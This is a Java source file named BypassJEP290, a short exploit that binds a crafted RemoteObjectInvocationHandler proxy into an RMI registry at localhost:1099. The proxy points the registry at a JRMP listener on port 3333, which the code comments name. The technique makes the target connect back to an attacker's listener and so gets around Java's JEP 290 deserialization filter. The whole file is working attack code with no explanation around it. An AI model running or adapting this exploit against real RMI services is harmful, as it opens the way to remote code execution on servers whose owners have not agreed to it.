import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class BypassJEP290 {
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
        Registry reg = LocateRegistry.getRegistry("localhost",1099); // rmi start at 2222
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), new Class[] {
                Registry.class
        }, obj);
        reg.bind("Hello",proxy);
    }
}